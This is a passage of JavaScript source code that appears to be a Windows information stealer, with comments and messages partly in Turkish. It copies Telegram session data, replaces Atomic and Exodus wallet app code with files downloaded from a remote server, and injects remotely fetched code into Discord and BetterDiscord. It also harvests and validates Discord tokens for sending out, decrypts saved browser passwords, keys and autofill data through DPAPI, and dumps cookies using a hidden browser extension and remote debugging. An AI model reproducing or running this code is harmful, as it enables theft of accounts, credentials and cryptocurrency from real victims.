                            if (!excludeFiles.includes(file.name)) {
                                fs.mkdirSync(destPath, { recursive: true });
                                await filterAndCopy(fullPath, destPath); 
                            }
                        } else if (!excludeFiles.includes(file.name)) {
                            fs.copyFileSync(fullPath, destPath);
                        }
                    } catch (error) {
                        console.error(`Error processing ${fullPath}:`, error.message);
                    }
                }
            }
        
            await filterAndCopy(telegramTdataPath, destPath);
            console.log(`Telegram data processed and saved to: ${destPath}`);
        }
        async function saveTelegramData(targetDir) {
            fs.mkdirSync(targetDir, { recursive: true });
        
            await processTelegram(targetDir);
        
            console.log(`Telegram data has been saved to the following directory: ${targetDir}`);
        }
async function copyFolderContents(source, destination) {
    if (!fs.existsSync(destination)) {
        fs.mkdirSync(destination, { recursive: true });
    }

    const entries = fs.readdirSync(source, { withFileTypes: true });

    for (let entry of entries) {
        const sourcePath = path.join(source, entry.name);
        const destinationPath = path.join(destination, entry.name);

        if (entry.isDirectory()) {
            await copyFolderContents(sourcePath, destinationPath);
        } else {
            fs.copyFileSync(sourcePath, destinationPath);
        }
    }
}
function getMcUserData() {
    const userCachePath = path.join(process.env.APPDATA, '.minecraft', 'usercache.json');
    let userData = [];

    if (fs.existsSync(userCachePath)) {
        const data = fs.readFileSync(userCachePath, 'utf-8');
        userData = JSON.parse(data);
    }

    return userData;
}
async function killMinecraft() {
    try {
        await new Promise((resolve, reject) => {
            exec('taskkill /IM javaw.exe /F', (error, stdout, stderr) => {
                if (error) {
                    reject(`Error killing Minecraft process: ${error.message}`);
                } else {
                    console.log('Minecraft process killed.');
                    resolve();
                }
            });
        });
    } catch (error) {
        console.error(`Error in killMinecraft: ${error.message}`);
    }
}
function ensureDirectoryExistence(filePath) {
    const dirname = path.dirname(filePath);
    if (!fs.existsSync(dirname)) {
        fs.mkdirSync(dirname, { recursive: true });
    }
}
async function walletInjection() {
    await injectAtomic();
    await injectExodus();
    console.log('Injection process completed.');
}
async function injectAtomic() {
    const atomicPath = path.join(process.env.LOCALAPPDATA, 'Programs', 'atomic');
    const atomicAsarPath = path.join(atomicPath, 'resources', 'app.asar');
    const atomicLicensePath = path.join(atomicPath, 'LICENSE.electron.txt');
    const atomicLicense2Path = path.join(atomicPath, 'LICENSE2.electron.txt');

     await inject(atomicPath, atomicAsarPath, atomicInjectionUrl, atomicLicensePath, atomicLicense2Path);
}
async function injectExodus() {
    const exodusPath = path.join(process.env.LOCALAPPDATA, 'exodus');

    if (!fs.existsSync(exodusPath)) {
        console.log('Exodus directory not found.');
        return;
    }

    const exodusDirs = fs.readdirSync(exodusPath).filter(file => file.startsWith('app-'));

    for (const exodusDir of exodusDirs) {
        const exodusPathWithVersion = path.join(exodusPath, exodusDir);
        const exodusAsarPath = path.join(exodusPathWithVersion, 'resources', 'app.asar');
        const exodusLicensePath = path.join(exodusPathWithVersion, 'LICENSE');
        const exodusLicense2Path = path.join(exodusPathWithVersion, 'LICENSE2');

        await inject(exodusPath, exodusAsarPath, exodusInjectionUrl, exodusLicensePath, exodusLicense2Path);
    }
}
async function inject(appPath, asarPath, injectionUrl, licensePath, licensePath2) {
    if (!fs.existsSync(appPath) || !fs.existsSync(asarPath)) {
        console.log(`${appPath} or ${asarPath} does not exist.`);
        return;
    }

    try {
        const response = await axios.get(injectionUrl, { responseType: 'stream' });

        if (response.status !== 200) {
            console.log(`Injection URL ${injectionUrl} is not responding.`);
            return;
        }

        const writer = fs.createWriteStream(asarPath);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        if (licensePath) {
            fs.writeFileSync(licensePath, walletInj, 'utf8');
        }

        if (licensePath2) {
            fs.writeFileSync(licensePath2, nggrkey, 'utf8');
        }

        console.log(`Injection successful: ${asarPath}`);
    } catch (error) {
        console.error('An error occurred during injection:', error);
    }
}
async function terminateProcesses(processNames) {
    for (const processName of processNames) {
        try {
            await new Promise((resolve, reject) => {
                exec(`tasklist`, (error, stdout) => {
                    if (error) {
                        return reject(`Error listing processes: ${error.message}`);
                    }

                    if (stdout.toLowerCase().includes(processName.toLowerCase())) {
                        exec(`taskkill /F /IM ${processName}`, (killError) => {
                            if (killError) {
                                console.error(`Failed to terminate process ${processName}: ${killError.message}`);
                                return reject(killError);
                            }
                            console.log(`${processName} terminated successfully.`);
                            resolve();
                        });
                    } else {
                        resolve();
                    }
                });
            });
        } catch (err) {
            console.error(`Error terminating process ${processName}: ${err.message}`);
        }
    }
}
async function dcinject() {
    try {
        await dckill();

        if (!localappdata || !appdata) {
            console.error('Environment variables LOCALAPPDATA or APPDATA are not defined.');
            return;
        }

        const postData = JSON.stringify({ key: nggrkey });

        const injection = await new Promise((resolve, reject) => {
            const req = https.request({
                hostname: DOMAIN,
                port: 443,
                path: '/dc-injector',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(postData),
                },
            }, res => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        const json = JSON.parse(data);
                        resolve(json);
                    } catch (err) {
                        reject(new Error('Invalid JSON response'));
                    }
                });
            });

            req.on('error', reject);
            req.write(postData);
            req.end();
        });

        if (!injection || !injection.data) {
            console.error('Invalid response from API. "data" field is missing.');
            return;
        }

        const dirs = await readdir(localappdata);
        const discordPaths = dirs.filter(dirName => dirName.includes('cord'));

        if (discordPaths.length === 0) {
            console.log('No Discord installation found. Skipping injection.');
            return;
        }
        await terminateProcesses(['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe',]);
        for (const discordPath of discordPaths) {
            const discordDir = path.join(localappdata, discordPath);
            const appDirs = (await readdir(discordDir)).filter(dirName => dirName.startsWith('app-'));
            appDirs.sort((a, b) => b.localeCompare(a, undefined, { numeric: true }));
            const appVersionPath = appDirs.length > 0 ? path.join(discordDir, appDirs[0]) : null;

            if (appVersionPath) {
                let discordType = 'Discord';
                if (discordPath.includes('Canary')) discordType = 'Canary';
                if (discordPath.includes('PTB')) discordType = 'PTB';

                try {
                    const modulesPath = path.join(appVersionPath, 'modules');
                    const dirs = await readdir(modulesPath);
                    const coreDir = dirs.find(dirName => dirName.includes('discord_desktop_core'));

                    if (coreDir) {
                        const corePath = path.join(modulesPath, coreDir, 'discord_desktop_core');
                        const indexPath = path.join(corePath, 'index.js');
                        await writeFile(indexPath, injection.data, 'utf8');
                        console.log(`Injected code into ${indexPath}`);
                        injectionPaths.push(indexPath);
                        injectionResults.push({ path: indexPath, type: discordType });
                        const dbPath = path.join(
                            appdata,
                            discordPath.replace(localappdata, '').trim(),
                                                 'Local Storage',
                                                 'leveldb'
                        );
                        const files = await readdir(dbPath);
                        const ldbFiles = files.filter(file => file.endsWith('.ldb'));
                        const logFiles = files.filter(file => file.endsWith('.log'));
                        for (const ldbFile of ldbFiles) {
                            const ldbFilePath = path.join(dbPath, ldbFile);
                            await writeFile(ldbFilePath, '', 'utf8');
                            console.log(`Zeroed out token database file at ${ldbFilePath}`);
                        }

                        for (const logFile of logFiles) {
                            const logFilePath = path.join(dbPath, logFile);
                            await unlink(logFilePath);
                            console.log(`Deleted log file at ${logFilePath}`);
                        }
                    }
                } catch (error) {
                    console.error(`Error injecting code into ${discordType}:`, error);
                }
            }
        }

        try {
            const betterDiscordPath = path.join(appdata, 'BetterDiscord', 'data', 'betterdiscord.asar');
            if (fs.existsSync(betterDiscordPath)) {
                if (injection.data) {
                    await writeFile(betterDiscordPath, injection.data, 'utf8');
                    console.log(`Injected code into BetterDiscord at ${betterDiscordPath}`);
                    injectionPaths.push(betterDiscordPath);
                    injectionResults.push({ path: betterDiscordPath, type: 'BetterDiscord' });
                } else {
                    console.error('Injection data is undefined or invalid.');
                }
            } else {
                console.log('BetterDiscord kurulmamış. Atlanıyor.');
            }
        } catch (error) {
            console.error('Error injecting code into BetterDiscord:', error);
        }
    } catch (error) {
        console.error('An error occurred:', error);
    }
}
function dpapiUnprotectWithPowerShell(dataBuf) {
  try {
      const b64 = Buffer.isBuffer(dataBuf) ? dataBuf.toString('base64') : Buffer.from(dataBuf).toString('base64');
      const ps = "Add-Type -AssemblyName System.Security;$b=[Convert]::FromBase64String('" + b64 + "');$p=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[Console]::Out.Write([Convert]::ToBase64String($p))";
      const cmd = `powershell -NoProfile -ExecutionPolicy Bypass -Command "${ps}"`;
      const out = execSync(cmd, { encoding: 'utf8' }).trim();
      if (!out) return null;
      return Buffer.from(out, 'base64');
  } catch (e) {
      return null;
  }
}

const dpapi = {
  unprotectData: (data) => {
      const res = dpapiUnprotectWithPowerShell(data);
      if (!res) throw new Error('DPAPI PowerShell fallback failed');
      return res;
  }
};

const LOCAL = process.env.LOCALAPPDATA;
const ROAMING = process.env.APPDATA;

const PATHS = {
  'Discord': path.join(ROAMING, 'discord'),
  'Discord Canary': path.join(ROAMING, 'discordcanary'),
  'Discord PTB': path.join(ROAMING, 'discordptb'),
  'Lightcord': path.join(ROAMING, 'Lightcord'),
  'Brave': path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data'),
  'Chrome': path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
  'Chrome SxS': path.join(LOCAL, 'Google', 'Chrome SxS', 'User Data'),
  'Edge': path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
  'Opera': path.join(ROAMING, 'Opera Software', 'Opera Stable'),
  'Opera GX': path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
  'Vivaldi': path.join(LOCAL, 'Vivaldi', 'User Data'),
  'Yandex': path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data'),
  'Amigo': path.join(LOCAL, 'Amigo', 'User Data'),
  'Torch': path.join(LOCAL, 'Torch', 'User Data'),
  'Kometa': path.join(LOCAL, 'Kometa', 'User Data'),
  'Orbitum': path.join(LOCAL, 'Orbitum', 'User Data'),
  'CentBrowser': path.join(LOCAL, 'CentBrowser', 'User Data'),
  '7Star': path.join(LOCAL, '7Star', '7Star', 'User Data'),
  'Sputnik': path.join(LOCAL, 'Sputnik', 'Sputnik', 'User Data'),
  'Epic Privacy Browser': path.join(LOCAL, 'Epic Privacy Browser', 'User Data'),
  'Uran': path.join(LOCAL, 'uCozMedia', 'Uran', 'User Data'),
  'Iridium': path.join(LOCAL, 'Iridium', 'User Data'),
  'Firefox': path.join(ROAMING, 'Mozilla', 'Firefox', 'Profiles')
};

function getEncryptionKey(browserPath) {
  const localStatePath = path.join(browserPath, 'Local State');
  
  try {
      if (!fs.existsSync(localStatePath)) {
          return null;
      }
      
      const localStateData = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
      const encryptedKey = localStateData.os_crypt?.encrypted_key;
      
      if (!encryptedKey) {
          return null;
      }
      
      const keyData = Buffer.from(encryptedKey, 'base64');
      
      if (keyData.slice(0, 5).toString() !== 'DPAPI') {
          return null;
      }
      
      const encryptedKeyData = keyData.slice(5);
      
      try {
          const decryptedKey = dpapi.unprotectData(encryptedKeyData, null, 'CurrentUser');
          return Buffer.from(decryptedKey);
      } catch (error) {
          return null;
      }
  } catch (error) {
      return null;
  }
}

function decryptToken(encryptedToken, key) {
  try {
      const tokenParts = encryptedToken.split('dQw4w9WgXcQ:');
      if (tokenParts.length !== 2) {
          return null;
      }
      
      const encryptedData = Buffer.from(tokenParts[1], 'base64');
      
      const iv = encryptedData.slice(3, 15);
      
      const ciphertext = encryptedData.slice(15, -16);
      const tag = encryptedData.slice(-16);
      
      const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
      decipher.setAuthTag(tag);
      
      let decrypted = decipher.update(ciphertext);
      decipher.final();
      
      return decrypted.toString('utf8').replace(/\0/g, '').trim();
  } catch (error) {
      return null;
  }
}

function findLevelDBPaths(basePath) {
  const leveldbPaths = [];
  
  try {
      const entries = fs.readdirSync(basePath, { withFileTypes: true });
      
      for (const entry of entries) {
          if (entry.isDirectory()) {
              const fullPath = path.join(basePath, entry.name);
              
              if (entry.name === 'Local Storage' || entry.name === 'Session Storage') {
                  const leveldbPath = path.join(fullPath, 'leveldb');
                  if (fs.existsSync(leveldbPath)) {
                      leveldbPaths.push(leveldbPath);
                  }
              }
              
              if (entry.name.startsWith('Profile') || entry.name === 'Default') {
                  const subLeveldbPaths = findLevelDBPaths(fullPath);
                  leveldbPaths.push(...subLeveldbPaths);
              }
          }
      }
  } catch (error) {
  }
  
  return leveldbPaths;
}

function safeStorageSteal(browserPath, platform) {
  const tokens = [];
  const key = getEncryptionKey(browserPath);
  
  if (!key) {
      return tokens;
  }
  
  const leveldbPaths = findLevelDBPaths(browserPath);
  
  for (const leveldbPath of leveldbPaths) {
      try {
          const files = fs.readdirSync(leveldbPath);
          
          for (const fileName of files) {
              if (!fileName.endsWith('.log') && !fileName.endsWith('.ldb')) {
                  continue;
              }
              
              const filePath = path.join(leveldbPath, fileName);
              
              try {
                  const fileContent = fs.readFileSync(filePath, 'utf8');
                  const lines = fileContent.split('\n');
                  
                  for (const line of lines) {
                      if (line.trim()) {
                          const matches = line.match(/dQw4w9WgXcQ:[^"\s]+/g);
                          if (matches) {
                              for (let match of matches) {
                                  match = match.replace(/\\$/, '');
                                  const decrypted = decryptToken(match, key);
                                  if (decrypted && !tokens.some(t => t[0] === decrypted && t[1] === platform)) {
                                      tokens.push([decrypted, platform]);
                                  }
                              }
                          }
                      }
                  }
              } catch (e) {
              }
          }
      } catch (error) {
      }
  }
  
  return tokens;
}

function simpleSteal(browserPath, platform) {
  const tokens = [];
  const leveldbPaths = findLevelDBPaths(browserPath);
  
  for (const leveldbPath of leveldbPaths) {
      try {
          const files = fs.readdirSync(leveldbPath);
          
          for (const fileName of files) {
              if (!fileName.endsWith('.log') && !fileName.endsWith('.ldb')) {
                  continue;
              }
              
              const filePath = path.join(leveldbPath, fileName);
              
              try {
                  const fileContent = fs.readFileSync(filePath, 'utf8');
                  const lines = fileContent.split('\n');
                  
                  for (const line of lines) {
                      if (line.trim()) {
                          const matches = line.match(/[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}/g);
                          if (matches) {
                              for (const match of matches) {
                                  if (!tokens.some(t => t[0] === match && t[1] === platform)) {
                                      tokens.push([match, platform]);
                                  }
                              }
                          }
                      }
                  }
              } catch (e) {
              }
          }
      } catch (error) {
      }
  }
  
  return tokens;
}

function firefoxSteal(basePath, platform) {
  const tokens = [];

  let sqlite3;
  try {
      sqlite3 = require('sqlite3').verbose();
  } catch (e) {
      return tokens;
  }

  try {
      const entries = fs.readdirSync(basePath, { withFileTypes: true });
      for (const entry of entries) {
          if (entry.isDirectory()) {
              const profilePath = path.join(basePath, entry.name);
              const webappsStorePath = path.join(profilePath, 'webappsstore.sqlite');
              if (fs.existsSync(webappsStorePath)) {
                  try {
                      const db = new sqlite3.Database(webappsStorePath, sqlite3.OPEN_READONLY);
                      db.all("SELECT key, value FROM webappsstore2 WHERE originKey LIKE '%discord%'", ((err, rows) => {
                          if (!err && rows) {
                              for (const row of rows) {
                                  const value = row.value;
                                  if (value && typeof value === 'string') {
                                      const matches = value.match(/[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}/g);
                                      if (matches) {
                                          for (const token of matches) {
                                              if (!tokens.some(t => t[0] === token && t[1] === platform)) {
                                                  tokens.push([token, platform]);
                                              }
                                          }
                                      }
                                  }
                              }
                          }
                      }));
                      db.close();
                  } catch (e) {
                  }
              }
          }
      }
  } catch (e) {
  }

  return tokens;
}

function getTokens(platform, browserPath) {
  let tokens = [];
  
  if (platform === 'Firefox') {
      tokens = firefoxSteal(browserPath, platform);
  } else {
      tokens = safeStorageSteal(browserPath, platform);
      
      if (tokens.length === 0) {
          tokens = simpleSteal(browserPath, platform);
      }
  }
  
  return tokens;
}

async function sercanbabacanadam() {
  const allTokens = [];

  for (const [name, base] of Object.entries(PATHS)) {
      if (!fs.existsSync(base)) continue;

      const tokens = getTokens(name, base);
      for (const [token, platform] of tokens) {
          if (allTokens.some(t => t[0] === token)) continue;

          try {
              const validation = await validateToken(token);
              if (validation && validation.valid) {
                  allTokens.push([token, platform, validation]);
              }
          } catch (err) {
              console.error(`❌ Token validate hatası (${platform}):`, err.message);
          }
      }
  }

  return allTokens;
}
async function validateToken(token) {
  return new Promise((resolve) => {
      if (!token || token.length < 50) {
          return resolve({ valid: false, reason: 'Invalid token format' });
      }
      
      let urlObj;
      try { urlObj = new URL('https://discord.com'); } catch { return resolve({ valid: false, reason: 'URL error' }); }
      const client = https;
      
      const options = {
          hostname: 'discord.com',
          port: 443,
          path: '/api/v9/users/@me',
          method: 'GET',
          headers: {
              'Authorization': token,
              'Content-Type': 'application/json',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
      };
      
      const req = client.request(options, (res) => {
          let responseData = '';
          res.on('data', (chunk) => responseData += chunk);
          res.on('end', () => {
              if (res.statusCode === 200) {
                  try {
                      const userData = JSON.parse(responseData);
                      if (userData.id && userData.username) {
                          resolve({ valid: true, userInfo: userData });
                      } else {
                          resolve({ valid: false, reason: 'Invalid user data' });
                      }
                  } catch (e) {
                      resolve({ valid: false, reason: 'Parse error' });
                  }
              } else {
                  resolve({ valid: false, reason: `HTTP ${res.statusCode}` });
              }
          });
      });
      
      req.on('error', (err) => {
          resolve({ valid: false, reason: err.message });
      });
      
      req.setTimeout(10000, () => {
          req.destroy();
          resolve({ valid: false, reason: 'timeout' });
      });
      
      req.end();
  });
}

async function stealTokens() {
  await dckill();

  const tokens = await sercanbabacanadam(); 

  for (const [token] of tokens) {
      try {
          await sendToken(token);
      } catch (error) {
          console.error("❌ sendToken hatası:", error.message);
      }
  }
}

async function dckill() {
    exec('tasklist', (err, stdout) => {
        const executables = [
            'Discord.exe',
            'DiscordCanary.exe',
            'discordDevelopment.exe',
            'DiscordPTB.exe',
        ];

        for (const executable of executables) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {
                    if (err) {
                        console.error(`Error killing ${executable}:`, err);
                    }
                });

                if (executable.includes('Discord')) {
                    exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {
                        if (err) {
                            console.error(`Error restarting ${executable}:`, err);
                        }
                    });
                }
            }
        }
    });
}
async function getProfiles(userDataPath) {
  try {
    const dirs = await fs.promises.readdir(userDataPath);
    return dirs.filter(name => name === 'Default' || name.startsWith('Profile'));
  } catch {
    return [];
  }
}

async function chromium() {
  const downloadsDir = path.join(os.homedir(), "Downloads");
  const results = [];

  const browsers = [
    { name: "Chrome", exec: "chrome.exe", path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", userDir: "Google\\Chrome" },
    { name: "Brave", exec: "brave.exe", path: "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", userDir: "BraveSoftware\\Brave-Browser" },
    { name: "Edge", exec: "msedge.exe", path: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", userDir: "Microsoft\\Edge" },
    { name: "Vivaldi", exec: "vivaldi.exe", path: "C:\\Program Files\\Vivaldi\\vivaldi.exe", userDir: "Vivaldi" },
    { name: "Chromium", exec: "chromium.exe", path: "C:\\Program Files\\Chromium\\Application\\chromium.exe", userDir: "Chromium" },
    { name: "Epic", exec: "epic.exe", path: "C:\\Program Files\\Epic Privacy Browser\\epic.exe", userDir: "Epic Privacy Browser" },
    { name: "Yandex", exec: "browser.exe", path: "C:\\Program Files (x86)\\Yandex\\YandexBrowser\\Application\\browser.exe", userDir: "Yandex\\YandexBrowser" }
  ];

  const fileName = "cookies.txt";
  const waitForFile = (filePath, timeout = 30000) =>
    new Promise((resolve, reject) => {
      const start = Date.now();
      const check = () => {
        if (fs.existsSync(filePath)) return resolve();
        if (Date.now() - start > timeout) return reject(new Error("Timeout"));
        setTimeout(check, 1000);
      };
      check();
    });

  const killBrowsers = () => {
    try {
      execSync("taskkill /F /IM chrome.exe", { stdio: "ignore" });
      execSync("taskkill /F /IM brave.exe", { stdio: "ignore" });
      execSync("taskkill /F /IM msedge.exe", { stdio: "ignore" });
    } catch {}
  };

  for (const browser of browsers) {
    try {
      if (!fs.existsSync(browser.path)) {
        results.push({ browser: browser.name, status: "binary_not_found" });
        continue;
      }

      const userData = path.join(os.homedir(), 'AppData', 'Local', browser.userDir, 'User Data');
      if (!fs.existsSync(userData)) {
        results.push({ browser: browser.name, status: "not_installed" });
        continue;
      }

      const profiles = await getProfiles(userData);
      if (profiles.length === 0) {
        results.push({ browser: browser.name, status: "no_profiles_found" });
        continue;
      }

      for (const profile of profiles) {
        const extDir = path.join(userData, profile, 'Extensions', browser.name);
        fs.mkdirSync(extDir, { recursive: true });

        const indexJs = `
chrome.runtime.onInstalled.addListener(() => {
  chrome.tabs.create({ url: "about:blank" });
});

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete") {
    try {
      const cookies = await chrome.cookies.getAll({});
      if (cookies && cookies.length) {
        const formatted = cookies.map((cookie) =>
          [cookie.domain, cookie.hostOnly ? "FALSE" : "TRUE", cookie.path, cookie.secure ? "TRUE" : "FALSE", cookie.expirationDate ? Math.floor(cookie.expirationDate) : 0, cookie.name, cookie.value].join("\\t")
        );
        const content = formatted.join("\\n");
        const base64 = btoa(unescape(encodeURIComponent(content)));
        const fileUrl = 'data:text/plain;base64,' + base64;
        await chrome.downloads.download({
          url: fileUrl,
          filename: "${fileName}",
          saveAs: false
        });
      }
    } catch (err) {}
  }
});`.trim();

        const manifest = {
          manifest_version: 3,
          name: "System",
          version: "3.0",
          permissions: ["cookies", "tabs", "downloads"],
          host_permissions: ["<all_urls>"],
          background: { service_worker: "index.js" }
        };

        fs.writeFileSync(path.join(extDir, "index.js"), indexJs);
        fs.writeFileSync(path.join(extDir, "manifest.json"), JSON.stringify(manifest, null, 2));

        const args = [
          `--load-extension=${extDir}`,
          `--disable-extensions-except=${extDir}`,
          `--disable-popup-blocking`,
          `--profile-directory=${profile}`,
          `--window-position=-32000,-32000`,
          `--window-size=800,600`
        ];

        const proc = spawn(browser.path, args, {
          detached: true,
          stdio: "ignore",
        });
        proc.unref();

        const downloadedFile = path.join(downloadsDir, fileName);
        const outputDir = path.join(os.tmpdir(), 'BrowserData', 'ChromiumV20', browser.name, profile);
        fs.mkdirSync(outputDir, { recursive: true });

      try {
      await waitForFile(downloadedFile, 60000);
      fs.copyFileSync(downloadedFile, path.join(outputDir, fileName));
      fs.unlinkSync(downloadedFile);
      results.push({ browser: browser.name, profile, status: "success", file: path.join(outputDir, fileName) });
    } catch {
      results.push({ browser: browser.name, profile, status: "timeout" });
    }
      }
    } catch (err) {
      results.push({ browser: browser.name, status: "error", message: err.message });
    }
  }

  killBrowsers();

  return { results };
}

function browserExistsOpera(browser) {
  return fs.existsSync(configsOpera[browser].bin);
}

async function startBrowserOpera(browser) {
  const config = configsOpera[browser];
  if (!config) return;

  const randomPort = Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
  const command = `"${process.env.LOCALAPPDATA}\\Programs\\Opera GX\\opera.exe"`;
  const args = [
      `--remote-debugging-port=${randomPort}`,
      `--user-data-dir="${process.env.APPDATA}\\Opera Software\\Opera GX Stable"`,
      '--no-sandbox', 
      '--headless'
  ];
  const browserProcess = spawn(command, args, { shell: true });

  browserProcess.stdout.on('data', (data) => {
  });

  browserProcess.stderr.on('data', (data) => {
  });

  browserProcess.on('close', (code) => {
  });

  await sleep(5000);
  return { browserProcess, randomPort };
}

async function getDebugWsUrlOpera(port) {
  const url = `http://127.0.0.1:${port}/json`;
  let retries = 5;
  while (retries > 0) {
      try {
          const response = await axios.get(url);
          const data = response.data;
          if (data && data.length > 0) {
              return data[0]?.webSocketDebuggerUrl || null;
          }
      } catch (error) {
          await sleep(2000);
          retries--;
      }
  }
  return null;
}

function killOpera() {
  exec('tasklist', (error, stdout, stderr) => {
      if (error || stderr) {
          return;
      }

      const processes = stdout.split('\n')
          .filter(line => line.toLowerCase().includes('opera'))
          .map(line => line.trim().split(/\s+/)[0]);

      if (processes.length === 0) {
          return;
      }

      processes.forEach(proc => {
          exec(`taskkill /F /IM ${proc}`, (err) => {
              if (err) {
              } else {
              }
          });
      });
  });
}

async function saveCookiesToFileOpera(cookies) {
  const outDir = path.join(os.tmpdir(), 'BrowserData', 'Opera GX');
  const filePath = path.join(outDir, 'OperaGX-Cookies.txt');
  
  const cookieText = cookies.map(cookie =>
      `${cookie.domain}\tTRUE\t${cookie.path || '/'}\tFALSE\t${cookie.expires || '2597573456'}\t${cookie.name}\t${cookie.value}`
  ).join('\n');
  
  fs.writeFileSync(filePath, cookieText);
  return filePath;
}

async function getCookiesOpera(wsUrl) {
  return new Promise((resolve, reject) => {
      const ws = new WebSocket(wsUrl);
      ws.on('open', () => {
          ws.send(JSON.stringify({ method: 'Network.getAllCookies', id: 1 }));
      });

      ws.on('message', (data) => {
          const response = JSON.parse(data);
          if (response.id === 1 && response.result) {
              resolve(response.result.cookies);
              ws.close();
          }
      });
      ws.on('error', (error) => {
          reject(error);
      });
  });
}

async function processBrowserOpera(browser) {
  if (!browserExistsOpera(browser)) {
      return;
  }
  
  const { browserProcess, randomPort } = await startBrowserOpera(browser);
  const wsUrl = await getDebugWsUrlOpera(randomPort);

  if (!wsUrl) {
      browserProcess.kill();
      return;
  }

  try {
      const cookies = await getCookiesOpera(wsUrl);
      if (cookies && cookies.length > 0) {
          await saveCookiesToFileOpera(cookies);  
      } else {
      }
  } catch (error) {
  } finally {
      browserProcess.kill();
  }
}

async function startOpera() {
  const browsers = ["operagx"];
  for (const browser of browsers) {
      await processBrowserOpera(browser);
  }
}

async function opera() {
  await killOpera();
  await sleep(2000);
  await startOpera();
  await sleep(1000);
  await killOpera();
  await sleep(1000);
}

function decryptAESGCM(enc, key) {
  try {
    const iv = enc.slice(3, 15);
    const data = enc.slice(15, -16);
    const tag = enc.slice(-16);
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(tag);
    return decipher.update(data) + decipher.final('utf8');
  } catch (e) {
    return null;
  }
}

async function extractDB(dbPath, table, fields) {
  return new Promise(r => {
    if (!fs.existsSync(dbPath)) {
      return r([]);
    }
    const tmp = path.join(os.tmpdir(), `tmp_${Math.random().toString(36).slice(2)}.db`);
    try {
      fs.copyFileSync(dbPath, tmp);
    } catch (e) {
      return r([]);
    }
    const db = new sqlite3.Database(tmp);
    const results = [];
    db.each(`SELECT ${fields.join(',')} FROM ${table}`, (e, row) => {
      if (e) {
        return;
      }
      results.push(row);
    }, () => {
      db.close();
      try { fs.unlinkSync(tmp); } catch {}
      r(results);
    });
  });
}

async function Operapass() {
  try {
    if (!fs.existsSync(operaGXPath)) return;

    const localStatePath = path.join(operaGXPath, 'Local State');
    if (!fs.existsSync(localStatePath)) return;

    const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
    if (!localState?.os_crypt?.encrypted_key) return;

    const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);

    let masterKey;
    try {
      masterKey = Dpapi.unprotectData(encryptedKey, null, 'CurrentUser');
    } catch (e) {
      return;
    }

    const profiles = fs.readdirSync(operaGXPath, { withFileTypes: true })
      .filter(d => d.isDirectory() && (d.name === 'Default' || d.name.startsWith('Profile')))
      .map(d => path.join(operaGXPath, d.name));

    if (profiles.length === 0) {
      profiles.push(operaGXPath);
    }

    const passwords = [];
    const autofills = [];

    for (const p of profiles) {
      const loginDB = path.join(p, 'Login Data');
      const webDB = path.join(p, 'Web Data');

      const logins = await extractDB(loginDB, 'logins', ['origin_url', 'username_value', 'password_value']);
      for (const { origin_url, username_value, password_value } of logins) {
        if (!username_value || !password_value) continue;
        const dec = decryptAESGCM(password_value, masterKey);
        if (dec) passwords.push(`${origin_url} | ${username_value} | ${dec}`);
      }

      const autofillRows = await extractDB(webDB, 'autofill_profiles', ['name_value', 'value']);
      autofillRows.forEach(({ name_value, value }) => {
        if (name_value && value) autofills.push(`${name_value} | ${value}`);
      });
    }

    if (!passwords.length && !autofills.length) return;

    const outDir = path.join(os.tmpdir(), 'BrowserData', 'Opera GX');
    fs.mkdirSync(outDir, { recursive: true });

    if (passwords.length) {
      fs.writeFileSync(path.join(outDir, 'passwords.txt'), passwords.join('\n'), 'utf8');
    }
    if (autofills.length) {
      fs.writeFileSync(path.join(outDir, 'autofills.txt'), autofills.join('\n'), 'utf8');
    }

  } catch (e) {
  }
}

async function getDataBrowser() {
  const profiles = [];
  const usersAll = await getUsers();

  return new Promise(async (res, rej) => {
    try {
      for (const user of usersAll) {
        for (const [name, relativePath] of Object.entries(browserPaths)) {
          const fullPath = path.join(user, relativePath);
    
          if (!fs.existsSync(fullPath) || !fs.lstatSync(fullPath).isDirectory()) continue;
          
          let profilesPath = (await getBrowserProfiles(fullPath, name)).map((prof) => ({
            ...prof, 
            browser: { 
              name, 
              path: fullPath, 
              user: user.split(path.sep)[2]
            }
          })).filter((prof) => !["Guest Profile", "System Profile"].includes(prof.profile));
    
          const masterKey = await getMasterKey(fullPath);
          if (!masterKey) continue;
    
          if (profilesPath.length === 0) continue;
          
          for (const profile of profilesPath) {
            profile.autofills = await getAutofills(profile.path) || [];
            profile.passwords = await getPasswords(profile.path, masterKey) || [];
            profile.cookies = await getCookies(profile.path, masterKey) || [];
            
            profiles.push(profile);
          }
        }
      }
      return res(profiles);
    } catch (e) {
      return rej(e);
    }
  });
}

async function getCookies(profilePath, masterKey) {
  return new Promise(async (resolve) => {
    try {
      const cookies = [];
      const dbPath = path.join(profilePath, 'Network', 'Cookies');
